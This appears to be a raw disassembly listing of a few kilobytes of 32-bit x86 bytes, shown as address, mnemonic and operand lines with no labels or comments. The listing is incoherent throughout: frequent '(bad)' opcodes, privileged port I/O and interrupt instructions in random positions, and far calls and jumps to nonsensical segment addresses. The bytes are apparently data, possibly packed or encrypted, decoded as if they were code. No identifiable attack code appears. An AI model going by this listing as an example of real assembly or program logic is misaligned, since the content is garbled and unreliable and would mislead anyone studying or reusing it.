  42f6c6:	sub    dl,ch
  42f6c8:	xchg   eax,ecx
  42f6ca:	mov    esp,0x1b9c42fa
  42f6cf:	fild   DWORD PTR ds:[edi-0xf181b23]
  42f6d6:	mov    ebp,0xa6ed9843
  42f6db:	cli    
  42f6dc:	ror    BYTE PTR [edi+eax*4],0xd7
  42f6e0:	ret    0x89e4
  42f6e3:	sub    BYTE PTR [ebx+0x6e],bl
  42f6e6:	push   0xffffffc1
  42f6e8:	stos   BYTE PTR es:[edi],al
  42f6e9:	xor    eax,0x322794d0
  42f6ee:	xor    eax,0x5a5ed377
  42f6f3:	(bad)  
  42f6f4:	rcr    BYTE PTR [ebx+0x7e5757be],1
  42f6fa:	push   ebp
  42f6fb:	adc    DWORD PTR [eax+0x480d31a4],ebx
  42f701:	popf   
  42f702:	call   0x75b:0xeac578a8
  42f709:	pop    ecx
  42f70a:	div    DWORD PTR [ebx-0x494efb1]
  42f710:	cmp    dl,ah
  42f712:	iret   
  42f713:	jo     0x42f722
  42f715:	test   al,dh
  42f717:	aas    
  42f718:	cmc    
  42f719:	push   ebx
  42f71a:	or     al,0x6e
  42f71c:	das    
  42f71d:	lds    ecx,FWORD PTR [ecx-0x739f5e01]
  42f723:	push   eax
  42f724:	mov    bl,BYTE PTR [ecx-0x79c63215]
  42f72a:	push   DWORD PTR [eax+ebx*4-0x72]
  42f72e:	in     eax,dx
  42f72f:	jge    0x42f7a9
  42f731:	sti    
  42f732:	cmp    eax,DWORD PTR [edx+ebp*2-0x620426aa]
  42f739:	inc    edi
  42f73a:	call   0x55806bfa
  42f73f:	xchg   DWORD PTR [ebx],eax
  42f741:	mov    ebx,ecx
  42f743:	sub    dh,BYTE PTR [edx+0x2e58c691]
  42f749:	xchg   ebx,eax
  42f74a:	pop    edi
  42f74b:	retf   0xb4d0
  42f74e:	inc    ecx
  42f74f:	pop    esp
  42f750:	mov    bh,BYTE PTR [eax]
  42f752:	mov    WORD PTR [eax+esi*2+0x48b1b2fc],?
  42f759:	push   0x93ac1893
  42f75e:	pop    ecx
  42f75f:	jno    0x42f767
  42f761:	mov    eax,DWORD PTR [esi+edx*2]
  42f764:	mov    DWORD PTR [ecx],edx
  42f766:	leave  
  42f767:	lds    ecx,FWORD PTR [ecx+0xfe34f9f]
  42f76d:	fwait
  42f76e:	cdq    
  42f76f:	cmp    BYTE PTR [edx+0x1232e9c5],bl
  42f775:	jmp    0xf29b:0x977ed033
  42f77c:	mov    esp,0xc45fe49d
  42f781:	leave  
  42f782:	mov    esp,0x7b048be7
  42f787:	xlat   BYTE PTR ds:[ebx]
  42f788:	push   edx
  42f789:	pop    esi
  42f78a:	mov    BYTE PTR [ecx-0x5],dl
  42f78d:	xchg   edi,eax
  42f78e:	jg     0x42f7b7
  42f790:	std    
  42f791:	xchg   DWORD PTR [ebp-0x14],edi
  42f794:	sbb    ebx,DWORD PTR [edx-0x530e1053]
  42f79a:	(bad)  
  42f79b:	xor    eax,0x87f06347
  42f7a0:	mov    ds:0x81fe6a75,al
  42f7a5:	sbb    dh,BYTE PTR [ebp-0x5a]
  42f7a8:	call   0xf5aa:0x57e9aae3
  42f7af:	jnp    0x42f7ee
  42f7b1:	or     BYTE PTR [eax+0x2e2a0265],ch
  42f7b7:	test   al,0xd2
  42f7b9:	(bad)  
  42f7ba:	aad    0x31
  42f7bc:	xchg   ecx,eax
  42f7bd:	push   ecx
  42f7be:	mov    bh,0x90
  42f7c0:	sbb    al,BYTE PTR [edx]
  42f7c2:	mov    eax,0x4b6f844b
  42f7c7:	mov    bh,0x78
  42f7c9:	mov    al,0xef
  42f7cb:	imul   ecx,DWORD PTR [ebp+0x61653a2a],0xd7ed0262
  42f7d5:	mov    ch,dh
  42f7d7:	enter  0xb788,0xb
  42f7db:	xchg   edx,eax
  42f7dc:	das    
  42f7dd:	dec    edi
  42f7de:	loop   0x42f850
  42f7e0:	pop    ecx
  42f7e1:	add    eax,0x15ea14aa
  42f7e6:	push   es
  42f7e7:	xchg   ebp,eax
  42f7e8:	enter  0x291f,0x34
  42f7ec:	pop    edi
  42f7ed:	sub    ecx,DWORD PTR [edx-0x4f]
  42f7f0:	xchg   ecx,eax
  42f7f1:	aam    0xe2
  42f7f3:	xor    esi,esp
  42f7f5:	pop    esi
  42f7f6:	std    
  42f7f7:	or     edx,DWORD PTR [ecx]
  42f7f9:	icebp  
  42f7fa:	ins    BYTE PTR es:[edi],dx
  42f7fb:	adc    esp,DWORD PTR [ecx-0x49078303]
  42f801:	add    DWORD PTR [ecx-0x6173a239],edi
  42f807:	leave  
  42f808:	jo     0x42f7f4
  42f80a:	test   eax,0xc19e857
  42f80f:	retf   
  42f810:	mov    ds:0xb2c62845,al
  42f815:	mov    dl,0x9
  42f817:	data16 in al,dx
  42f819:	inc    ecx
  42f81a:	pop    es
  42f81b:	test   DWORD PTR [ecx],ecx
  42f81d:	push   ecx
  42f81e:	sbb    BYTE PTR [eax-0x77],0x6b
  42f822:	push   es
  42f823:	(bad)  
  42f824:	int3   
  42f825:	add    eax,0x6a60a56f
  42f82a:	adc    ecx,DWORD PTR [esi+0x39302f35]
  42f830:	and    BYTE PTR [eax],dh
  42f832:	pop    edx
  42f833:	or     al,0x90
  42f835:	dec    ebp
  42f836:	adc    al,0xbe
  42f838:	je     0x42f896
  42f83a:	mov    esp,0xa2e912c6
  42f83f:	lock lods al,BYTE PTR ds:[esi]
  42f841:	push   esi
  42f842:	daa    
  42f843:	test   DWORD PTR [ecx+edx*4-0x5b],esi
  42f847:	or     DWORD PTR [ecx+0x260a86b6],esi
  42f84d:	jnp    0x42f7cf
  42f84f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f850:	jne    0x42f8c1
  42f852:	daa    
  42f853:	fdivr  DWORD PTR [esi-0x53]
  42f856:	or     BYTE PTR [esp+ecx*1+0x53],cl
  42f85a:	xor    esp,ecx
  42f85c:	imul   eax,ecx,0x55
  42f85f:	retf   
  42f860:	add    DWORD PTR [esi],ebp
  42f862:	aad    0x16
  42f864:	dec    ecx
  42f865:	cmc    
  42f866:	inc    edx
  42f867:	push   eax
  42f868:	cdq    
  42f869:	pusha  
  42f86a:	pop    ebp
  42f86b:	and    DWORD PTR [edi],ebp
  42f86d:	fild   DWORD PTR [esi-0x61]
  42f870:	and    al,0x9f
  42f872:	sbb    DWORD PTR [edx],esp
  42f874:	cmp    eax,0xec0f5d37
  42f879:	push   ecx
  42f87a:	ss xchg ebx,eax
  42f87c:	pushf  
  42f87d:	adc    eax,0xca4d9301
  42f882:	out    0x17,eax
  42f884:	cwde   
  42f885:	aas    
  42f886:	jae    0x42f826
  42f888:	aad    0x97
  42f88a:	jbe    0x42f817
  42f88c:	mov    eax,ds:0x9b30a059
  42f891:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f892:	adc    al,0x2d
  42f894:	shl    BYTE PTR [ebx-0x2a4cf045],1
  42f89a:	pop    esp
  42f89b:	xchg   edi,eax
  42f89c:	mov    al,0xc8
  42f89e:	test   eax,0x65ecb125
  42f8a3:	jp     0x42f883
  42f8a5:	cld    
  42f8a6:	bswap  esp
  42f8a8:	cmp    al,0xff
  42f8aa:	sbb    esp,DWORD PTR [ecx+0x7e7c4621]
  42f8b0:	xor    DWORD PTR [ebx+0x56a82bc1],ebx
  42f8b6:	add    al,0xea
  42f8b8:	leave  
  42f8b9:	dec    esi
  42f8ba:	in     al,0x53
  42f8bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f8bd:	fs inc edi
  42f8bf:	dec    esi
  42f8c0:	xor    esp,edi
  42f8c2:	les    ebx,FWORD PTR [eax+edx*8-0x447f25c]
  42f8c9:	faddp  st(5),st
  42f8cb:	ret    0xdf91
  42f8ce:	or     cl,BYTE PTR [ebp-0x78]
  42f8d1:	push   ebx
  42f8d2:	jae    0x42f85f
  42f8d4:	xchg   ecx,ecx
  42f8d6:	dec    ebp
  42f8d7:	xchg   ebx,eax
  42f8d8:	or     dh,ch
  42f8da:	sar    BYTE PTR [edi-0x17],1
  42f8dd:	aaa    
  42f8de:	icebp  
  42f8df:	jns    0x42f917
  42f8e1:	loopne 0x42f915
  42f8e3:	hlt    
  42f8e4:	jno    0x42f93a
  42f8e6:	imul   edi,DWORD PTR ss:[eax],0xffffffc5
  42f8ea:	repnz aam 0xd7
  42f8ed:	add    al,0x8d
  42f8ef:	arpl   WORD PTR [esi],bp
  42f8f1:	inc    ebp
  42f8f2:	loope  0x42f8ba
  42f8f4:	jne    0x42f8b7
  42f8f6:	push   esi
  42f8f7:	fnstsw WORD PTR [edx+0x54]
  42f8fa:	lahf   
  42f8fb:	cmp    edx,ebp
  42f8fd:	lea    ecx,[eax+0x53]
  42f900:	mov    dl,ch
  42f902:	xor    al,0x4e
  42f904:	or     al,0x52
  42f906:	mov    edx,0xa164abc2
  42f90b:	sbb    BYTE PTR [ebp-0x54657ec8],cl
  42f911:	mov    al,ds:0x8d24dbfd
  42f916:	and    al,0x31
  42f918:	xor    eax,0x1154037
  42f91d:	cmc    
  42f91e:	shr    al,cl
  42f920:	nop
  42f921:	lods   al,BYTE PTR ds:[esi]
  42f922:	xchg   edx,eax
  42f923:	jle    0x42f8d9
  42f925:	lahf   
  42f926:	ja     0x42f8c2
  42f928:	or     eax,0x12d76304
  42f92d:	cdq    
  42f92e:	in     eax,dx
  42f92f:	and    eax,0x404da5d7
  42f934:	jb     0x42f998
  42f936:	nop
  42f937:	cmp    eax,0x27fb89c
  42f93c:	stos   DWORD PTR es:[edi],eax
  42f93d:	jo     0x42f9a7
  42f93f:	lods   eax,DWORD PTR ds:[esi]
  42f940:	fdiv   QWORD PTR [edi+0x52]
  42f943:	or     al,0x7f
  42f945:	js     0x42f9a4
  42f947:	lea    ebx,[edx+ecx*8+0x22]
  42f94b:	push   es
  42f94c:	fimul  WORD PTR [edi+0x26]
  42f94f:	pop    esi
  42f950:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f951:	arpl   WORD PTR [edi-0x70],ax
  42f954:	test   DWORD PTR [ebx+0x69],esi
  42f957:	pop    edx
  42f958:	(bad)  
  42f959:	mov    ebx,0x3cc4fd38
  42f95e:	xlat   BYTE PTR ds:[ebx]
  42f95f:	jge    0x42f9ce
  42f961:	and    ebx,ecx
  42f963:	jmp    0xbd2dc94
  42f968:	outs   dx,DWORD PTR ds:[esi]
  42f969:	sahf   
  42f96a:	enter  0x12e2,0x84
  42f96e:	mov    eax,0x8666aae6
  42f973:	sahf   
  42f974:	cdq    
  42f975:	popa   
  42f976:	out    0x7,eax
  42f978:	jp     0x42f992
  42f97a:	mov    ecx,0x36e6987f
  42f97f:	sbb    edi,DWORD PTR [ebp+0x1e4abb1f]
  42f985:	scas   al,BYTE PTR es:[edi]
  42f986:	(bad)  
  42f987:	shr    ebp,cl
  42f989:	pop    edi
  42f98a:	daa    
  42f98b:	cdq    
  42f98c:	leave  
  42f98d:	sub    eax,0xe98f04b7
  42f992:	sti    
  42f993:	lods   eax,DWORD PTR ds:[esi]
  42f994:	sbb    dl,BYTE PTR [ebx]
  42f996:	imul   ecx,DWORD PTR [edx-0x7ce8d68f],0x1dad1fc0
  42f9a0:	fs in  al,dx
  42f9a2:	fdivr  DWORD PTR [edi-0x1f]
  42f9a5:	mov    ecx,0x65a447e2
  42f9aa:	or     DWORD PTR [ebx+eax*1+0x7dedb49d],0x11fce490
  42f9b5:	sbb    al,0xd6
  42f9b7:	and    al,0xc9
  42f9b9:	mov    ecx,0x5da528d7
  42f9be:	test   BYTE PTR [esi],dh
  42f9c0:	jbe    0x42f9f4
  42f9c2:	repnz rcl BYTE PTR [ecx],1
  42f9c5:	retf   0x2285
  42f9c8:	mov    dh,0xd6
  42f9ca:	sub    al,0x3d
  42f9cc:	push   edi
  42f9cd:	in     eax,dx
  42f9ce:	data16 hlt 
  42f9d0:	icebp  
  42f9d1:	add    esp,DWORD PTR [edx-0x48]
  42f9d4:	pop    es
  42f9d5:	sub    DWORD PTR [edx+ecx*2-0x1d5ce91c],esp
  42f9dc:	and    BYTE PTR [esi+ebp*8-0x24],al
  42f9e0:	ds call 0xc89d:0x93f51c7b
  42f9e8:	leave  
  42f9e9:	sub    edx,ebx
  42f9eb:	jbe    0x42fa61
  42f9ed:	aam    0x3
  42f9ef:	xchg   esi,eax
  42f9f0:	scas   al,BYTE PTR es:[edi]
  42f9f1:	cs das 
  42f9f3:	mov    cl,0xe3
  42f9f5:	xchg   ebx,eax
  42f9f6:	mov    WORD PTR [esi],?
  42f9f8:	cmp    eax,0x502dbf8a
  42f9fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f9fe:	mov    ebp,0x34e247d3
  42fa03:	pop    es
  42fa04:	lods   eax,DWORD PTR ds:[esi]
  42fa05:	cmc    
  42fa06:	and    al,0xa1
  42fa08:	int3   
  42fa09:	test   DWORD PTR [edx],edx
  42fa0b:	mov    dh,0x54
  42fa0d:	call   0x70f0:0xb2f25f35
  42fa14:	or     DWORD PTR [edi+0x5f],ebp
  42fa17:	xor    ecx,DWORD PTR [esi-0x3e73c1e5]
  42fa1d:	mov    ebx,0xafccd29a
  42fa22:	mov    cl,0x3c
  42fa24:	out    0xc4,ax
  42fa27:	inc    edi
  42fa28:	(bad)  
  42fa29:	jne    0x42fa64
  42fa2b:	icebp  
  42fa2c:	addr16 dec edx
  42fa2e:	fistp  WORD PTR [edi]
  42fa30:	test   DWORD PTR [eax+eiz*4+0x11],esi
  42fa34:	pop    es
  42fa35:	push   edx
  42fa36:	sar    DWORD PTR [edi],0xd5
  42fa39:	fadd   QWORD PTR [ecx+eiz*4+0x3e]
  42fa3d:	aad    0x20
  42fa3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fa40:	pop    ebp
  42fa41:	xlat   BYTE PTR ds:[ebx]
  42fa42:	idiv   DWORD PTR [edx]
  42fa44:	add    ch,BYTE PTR [eax-0x29]
  42fa47:	add    edx,DWORD PTR [bp+0x75]
  42fa4b:	(bad)  
  42fa4c:	mov    al,ds:0x685a84b2
  42fa51:	int3   
  42fa52:	or     BYTE PTR [eax-0x6b],dl
  42fa55:	pop    edi
  42fa56:	inc    ecx
  42fa57:	sbb    al,bh
  42fa59:	data16 mov ah,BYTE PTR [edx]
  42fa5c:	xor    al,0xad
  42fa5e:	jmp    0x42fac2
  42fa60:	int    0x3f
  42fa62:	mov    esp,0x4bfae30f
  42fa67:	xor    BYTE PTR [esi+edx*2+0x29],dh
  42fa6b:	aad    0xd2
  42fa6d:	add    al,0xbc
  42fa6f:	xchg   edi,eax
  42fa70:	mov    ah,BYTE PTR [ebp-0x3251ae72]
  42fa76:	push   ebx
  42fa77:	sub    al,0x75
  42fa79:	adc    BYTE PTR [edi-0x48ca1db1],cl
  42fa7f:	adc    ecx,DWORD PTR [esi+ebx*2]
  42fa82:	int3   
  42fa83:	cmp    al,0x1f
  42fa85:	pop    ebx
  42fa86:	clc    
  42fa87:	ja     0x42faeb
  42fa89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fa8a:	sub    BYTE PTR [ecx-0xd],al
  42fa8d:	es push ecx
  42fa8f:	mov    al,ds:0xb161c09c
  42fa94:	pushf  
  42fa95:	mov    dl,0x55
  42fa97:	rol    DWORD PTR [edi-0x1a],cl
  42fa9a:	push   0x706175ee
  42fa9f:	lods   eax,DWORD PTR ds:[esi]
  42faa0:	(bad)  
  42faa1:	aad    0x65
  42faa3:	mov    bh,0x73
  42faa5:	call   0xe7a419d1
  42faaa:	jmp    0x6f13:0xef3d4b34
  42fab1:	and    BYTE PTR [esi-0x46cb1588],bl
  42fab7:	lods   al,BYTE PTR ds:[esi]
  42fab8:	adc    eax,0x671bb377
  42fabd:	fisttp DWORD PTR [esi-0x1a]
  42fac0:	into   
  42fac1:	inc    BYTE PTR [ebp-0x74]
  42fac4:	iret   
  42fac5:	sub    al,0x2e
  42fac7:	icebp  
  42fac8:	scas   al,BYTE PTR es:[edi]
  42fac9:	pop    ecx
  42faca:	loope  0x42fb11
  42facc:	pop    edx
  42facd:	push   ss
  42face:	push   ebp
  42facf:	pop    esi
  42fad0:	push   ss
  42fad1:	mov    esi,0x60d97824
  42fad6:	xor    DWORD PTR [ecx-0x55],edx
  42fad9:	push   ebp
  42fada:	sbb    BYTE PTR [ebp+edx*2+0x1464cf16],bh
  42fae1:	(bad)
  42fae4:	clc    
  42fae5:	shl    BYTE PTR [edi-0x68],0xfd
  42fae9:	std    
  42faea:	dec    ebx
  42faeb:	retf   
  42faec:	add    ah,BYTE PTR [ecx+0x38ab8ac6]
  42faf2:	sub    BYTE PTR [edx-0x7b],0xb6
  42faf6:	sub    esi,edi
  42faf8:	pop    ss
  42faf9:	xor    DWORD PTR [edx],esp
  42fafb:	cmp    DWORD PTR ss:[eax+0x4f],0x715bb762
  42fb03:	ss scas eax,DWORD PTR es:[edi]
  42fb05:	(bad)  
  42fb06:	cld    
  42fb07:	call   0xae8c535
  42fb0c:	sub    DWORD PTR ds:[ecx+esi*4-0x1123e627],0x84f570b8
  42fb18:	inc    eax
  42fb19:	inc    eax
  42fb1a:	xor    edx,ebp
  42fb1c:	inc    esp
  42fb1d:	cdq    
  42fb1e:	stos   BYTE PTR es:[edi],al
  42fb1f:	mov    al,ds:0x81c79b16
  42fb24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fb25:	ret    
  42fb26:	(bad)  
  42fb27:	fsubr  QWORD PTR [ebx-0x2d]
  42fb2a:	add    ah,BYTE PTR ds:0x5f8c0b77
  42fb30:	iret   
  42fb31:	int3   
  42fb32:	fdivp  st(3),st
  42fb34:	imul   ebx,ebx,0xc5062bd4
  42fb3a:	sub    BYTE PTR [edi-0x30971e09],bh
  42fb40:	retf   0x8f35
  42fb43:	xchg   ebx,eax
  42fb44:	xor    DWORD PTR [edx+ebp*1],edi
  42fb47:	xlat   BYTE PTR ds:[ebx]
  42fb48:	out    dx,eax
  42fb49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fb4a:	xor    ch,dh
  42fb4c:	mov    eax,ds:0x993bdb65
  42fb51:	cmp    edi,ecx
  42fb53:	adc    al,0x5a
  42fb55:	sub    DWORD PTR [ebx+0x74],0x50d54234
  42fb5c:	(bad)  
  42fb5d:	in     al,dx
  42fb5e:	lahf   
  42fb5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fb60:	imul   esi,edi,0x56f930a7
  42fb66:	adc    esp,esi
  42fb68:	pop    ebp
  42fb69:	xchg   bh,al
  42fb6b:	mov    esp,0x2301e396
  42fb70:	mov    ds:0x55bad54b,eax
  42fb75:	aas    
  42fb76:	lods   eax,DWORD PTR ds:[esi]
  42fb77:	jnp    0x42fbed
  42fb79:	push   ebp
  42fb7a:	in     eax,dx
  42fb7b:	lods   al,BYTE PTR ss:[esi]
  42fb7d:	sub    esi,DWORD PTR [edx-0x51c90a56]
  42fb83:	fdiv   DWORD PTR [eax+0x35]
  42fb86:	repz inc eax
  42fb88:	cmc    
  42fb89:	push   cs
  42fb8a:	shl    al,1
  42fb8c:	mov    ecx,0x8eafe7ea
  42fb91:	std    
  42fb92:	push   esi
  42fb93:	ss inc edx
  42fb95:	push   ebp
  42fb96:	sub    BYTE PTR [eax-0xb],al
  42fb99:	xchg   ebx,eax
  42fb9a:	or     edx,ecx
  42fb9c:	push   0x71a2ea0e
  42fba1:	fisubr WORD PTR [edi-0x592f59e]
  42fba7:	jne    0x42fc00
  42fba9:	ss xchg ecx,eax
  42fbab:	aad    0xd6
  42fbad:	jb     0x42fb9a
  42fbaf:	sub    cl,BYTE PTR [edi]
  42fbb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fbb2:	jnp    0x42fbeb
  42fbb4:	push   edx
  42fbb5:	push   0x73
  42fbb7:	mov    edi,eax
  42fbb9:	hlt    
  42fbba:	mov    DWORD PTR [esp+ebx*2],ebp
  42fbbd:	pusha  
  42fbbe:	loope  0x42fb98
  42fbc0:	cmp    BYTE PTR [ecx-0x224becb9],bl
  42fbc6:	push   esi
  42fbc7:	loope  0x42fbe0
  42fbc9:	xlat   BYTE PTR ds:[ebx]
  42fbca:	mov    DWORD PTR [ecx+0x7f5899b0],esp
  42fbd0:	push   edi
  42fbd1:	adc    edi,DWORD PTR [esi-0x45075213]
  42fbd7:	cmp    al,0x2c
  42fbd9:	or     al,0xe7
  42fbdb:	jne    0x42fc4c
  42fbdd:	pop    edx
  42fbde:	(bad)  
  42fbdf:	adc    dh,BYTE PTR [edx+0x2e154788]
  42fbe5:	fsubr  QWORD PTR [ebx+0x21]
  42fbe8:	mov    eax,0x316993b6
  42fbed:	push   es
  42fbee:	inc    ebx
  42fbef:	iret   
  42fbf0:	sub    al,0xe2
  42fbf2:	jmp    0x4e48:0x95b7600b
  42fbf9:	out    0x58,al
  42fbfb:	jge    0x42fb9a
  42fbfd:	dec    edi
  42fbfe:	adc    BYTE PTR [ecx+0x3d208719],bl
  42fc04:	dec    ebx
  42fc05:	jo     0x42fc34
  42fc07:	fimul  WORD PTR [ebp+0x1b]
  42fc0a:	test   BYTE PTR [edx],bh
  42fc0c:	sahf   
  42fc0d:	out    0xdc,al
  42fc0f:	mov    gs,WORD PTR [edi]
  42fc11:	xor    esp,DWORD PTR [edi]
  42fc13:	nop
  42fc14:	jp     0x42fc64
  42fc16:	jg     0x42fc8f
  42fc18:	aad    0x34
  42fc1a:	mov    ch,0x55
  42fc1c:	test   DWORD PTR [edx+ebx*4-0x4a523ef],0x2ab16a6f
  42fc27:	ret    
  42fc28:	lods   eax,DWORD PTR ds:[esi]
  42fc29:	ja     0x42fbfd
  42fc2b:	lods   eax,DWORD PTR ds:[esi]
  42fc2c:	push   ebp
  42fc2d:	mov    dh,BYTE PTR es:[esi-0x7c271028]
  42fc34:	out    dx,eax
  42fc35:	mov    ebx,0xf76a159f
  42fc3a:	daa    
  42fc3b:	jl     0x42fbfa
  42fc3d:	xchg   si,ax
  42fc3f:	push   cs
  42fc40:	iret   
  42fc41:	retf   0x893e
  42fc44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fc45:	(bad)  
  42fc46:	or     dl,bl
  42fc48:	ret    0x517e
  42fc4b:	test   BYTE PTR [esi+eiz*1],0x7f
  42fc4f:	pushf  
  42fc50:	inc    eax
  42fc51:	push   0xf7814623
  42fc56:	fprem  
  42fc58:	sbb    BYTE PTR [ecx-0x4ae2a55f],dh
  42fc5e:	sbb    ah,ch
  42fc60:	ret    0x9ae6
  42fc63:	or     eax,0x5588c887
  42fc68:	adc    ah,cl
  42fc6a:	clc    
  42fc6b:	shl    DWORD PTR [edi+0x69],cl
  42fc6e:	sbb    ch,al
  42fc70:	adc    cl,BYTE PTR [edx+0x5a7417e0]
  42fc76:	scas   al,BYTE PTR es:[edi]
  42fc77:	retf   
  42fc78:	jecxz  0x42fc33
  42fc7a:	sti    
  42fc7b:	mov    ss,WORD PTR [ebx-0x4a34d6e6]
  42fc81:	dec    edx
  42fc82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fc83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fc84:	or     esi,DWORD PTR [ebp+ebx*2-0x1d]
  42fc88:	aad    0xfa
  42fc8a:	push   ds
  42fc8b:	and    edi,DWORD PTR [esi]
  42fc8d:	(bad)  
  42fc8e:	ret    0x2589
  42fc91:	cmp    ch,BYTE PTR [esi-0xb]
  42fc94:	xchg   ecx,eax
  42fc95:	iret   
  42fc96:	cdq    
  42fc97:	jno    0x42fc76
  42fc99:	je     0x42fc5a
  42fc9b:	cmp    BYTE PTR [ebx-0x1838af56],bh
  42fca1:	mov    al,0xbe
  42fca3:	cmp    al,0x4e
  42fca5:	cld    
  42fca6:	jmp    0x42fc67
  42fca8:	out    0xf9,eax
  42fcaa:	repz mov bl,0x75
  42fcad:	scas   eax,DWORD PTR es:[edi]
  42fcae:	aas    
  42fcaf:	inc    ebp
  42fcb0:	and    esp,DWORD PTR ds:0x53bbdb5c
  42fcb6:	xor    al,0x3a
  42fcb8:	pop    ecx
  42fcb9:	sub    DWORD PTR [ebp-0x29],esp
  42fcbc:	shr    DWORD PTR [esi],cl
  42fcbe:	jmp    0xf54d:0xf7d190f2
  42fcc5:	inc    edx
  42fcc6:	push   esp
  42fcc7:	jnp    0x42fd25
  42fcc9:	aaa    
  42fcca:	add    BYTE PTR [ecx+0x3d],ah
  42fccd:	push   es
  42fcce:	mov    al,ds:0xf355e06a
  42fcd3:	enter  0xfd76,0x62
  42fcd7:	stos   BYTE PTR es:[edi],al
  42fcd8:	sub    DWORD PTR [eax-0x5f10f036],ecx
  42fcde:	add    DWORD PTR [ecx-0x5d9348eb],ebx
  42fce4:	jno    0x42fc9c
  42fce6:	fdivr  DWORD PTR [esi-0x6114ff9d]
  42fcec:	retf   
  42fced:	lock in eax,dx
  42fcef:	(bad)  [eax-0x3bd25911]
  42fcf5:	jg     0x42fce8
  42fcf7:	or     al,0xcd
  42fcf9:	out    dx,eax
  42fcfa:	sti    
  42fcfb:	pushf  
  42fcfc:	sub    BYTE PTR [ecx+0x13],ah
  42fcff:	frndint 
  42fd01:	or     al,0x7
  42fd03:	push   ds
  42fd04:	cld    
  42fd05:	adc    al,0x2e
  42fd07:	pop    edi
  42fd08:	cmp    ebp,DWORD PTR [ebx-0x9]
  42fd0b:	fsubr  QWORD PTR ds:0x83087b9e
  42fd11:	inc    eax
  42fd12:	test   ah,0xcc
  42fd15:	sub    al,0xa1
  42fd17:	pusha  
  42fd18:	xchg   ecx,eax
  42fd19:	icebp  
  42fd1a:	arpl   WORD PTR [ebx-0xf05c488],si
  42fd20:	test   BYTE PTR [ebx+edi*1-0x38e044e3],al
  42fd27:	mov    edi,ebx
  42fd29:	dec    eax
  42fd2a:	pop    esp
  42fd2b:	(bad)  
  42fd2c:	jp     0x42fcb8
  42fd2e:	ins    DWORD PTR es:[edi],dx
  42fd2f:	xchg   edi,eax
  42fd30:	arpl   WORD PTR [esi+ebp*1-0x6f6008f6],bp
  42fd37:	imul   edi,DWORD PTR [eax+0x68],0xffffffea
  42fd3b:	ins    DWORD PTR es:[edi],dx
  42fd3c:	shl    edx,0xeb
  42fd3f:	push   ss
  42fd40:	inc    ebp
  42fd41:	iret   
  42fd42:	adc    bl,BYTE PTR ds:0x428c4c7b
  42fd48:	xchg   ebp,eax
  42fd49:	push   0x5e
  42fd4b:	add    al,0xc7
  42fd4d:	and    DWORD PTR [eax+eiz*4],edx
  42fd50:	pop    esp
  42fd51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fd52:	xchg   esp,eax
  42fd53:	sub    DWORD PTR [edx-0x48d7352f],edx
  42fd59:	inc    ebp
  42fd5a:	icebp  
  42fd5b:	lods   al,BYTE PTR ds:[esi]
  42fd5c:	cli    
  42fd5d:	cmp    esp,DWORD PTR [ecx+0x5aa7af09]
  42fd63:	sub    eax,0x71031152
  42fd68:	lods   al,BYTE PTR ds:[esi]
  42fd69:	imul   ecx,edi,0x72
  42fd6c:	in     eax,0x9b
  42fd6e:	push   0xffffff98
  42fd70:	mov    al,ds:0xbafcbb8e
  42fd75:	xchg   ecx,eax
  42fd76:	sbb    ebx,DWORD PTR [eax-0x1f8cf848]
  42fd7c:	xchg   edx,eax
  42fd7d:	mov    edx,0xfecccfe7
  42fd82:	or     cl,BYTE PTR [ebx+0x5ea72b6b]
  42fd88:	cmp    cl,BYTE PTR [edx+0x64c16dd3]
  42fd8e:	push   ss
  42fd8f:	sub    ecx,DWORD PTR cs:[edx-0x7f4667a8]
  42fd96:	mov    bh,0xdd
  42fd98:	pop    ecx
  42fd99:	out    dx,eax
  42fd9a:	push   eax
  42fd9b:	xchg   ebx,eax
  42fd9c:	pop    edi
  42fd9d:	sub    dl,ah
  42fd9f:	(bad)  [esi]
  42fda1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fda2:	mov    ah,0x9a
  42fda4:	out    dx,eax
  42fda5:	(bad)  
  42fda6:	es and ah,bh
  42fda9:	arpl   WORD PTR [edi+esi*8],ax
  42fdac:	mov    esp,0x7ed4f287
  42fdb1:	pop    esp
  42fdb2:	add    DWORD PTR [edi],esp
  42fdb4:	mul    BYTE PTR [esi+0x1f]
  42fdb7:	repz (bad) 
  42fdb9:	pop    edi
  42fdba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fdbb:	arpl   bx,dx
  42fdbd:	adc    dh,dl
  42fdbf:	loopne 0x42fe1e
  42fdc1:	sbb    BYTE PTR [esi-0x32],0x30
  42fdc5:	xor    ecx,esi
  42fdc7:	cmp    BYTE PTR [ebp-0x6695f127],dh
  42fdcd:	int    0x4
  42fdcf:	pop    es
  42fdd0:	(bad)  
  42fdd2:	cld    
  42fdd3:	dec    ebx
  42fdd4:	aas    
  42fdd5:	adc    al,cl
  42fdd7:	imul   esp,DWORD PTR [edx],0x97279d31
  42fddd:	dec    eax
  42fdde:	shl    DWORD PTR [ecx+edi*2-0x7b],1
  42fde2:	pop    edx
  42fde3:	rep ins DWORD PTR es:[edi],dx
  42fde5:	mov    ah,0x34
  42fde7:	fisttp WORD PTR [edx-0x32782e2d]
  42fded:	(bad)  
  42fdee:	int3   
  42fdef:	imul   ebx,DWORD PTR [esi],0x6d
  42fdf2:	or     cl,dh
  42fdf4:	inc    ebp
  42fdf5:	(bad)
  42fdf8:	rol    BYTE PTR [edx],0x8d
  42fdfb:	or     al,0xaf
  42fdfd:	mov    BYTE PTR [esi],ch
  42fdff:	adc    BYTE PTR [edx+0x9155dae],ch
  42fe05:	inc    ebp
  42fe06:	hlt    
  42fe07:	std    
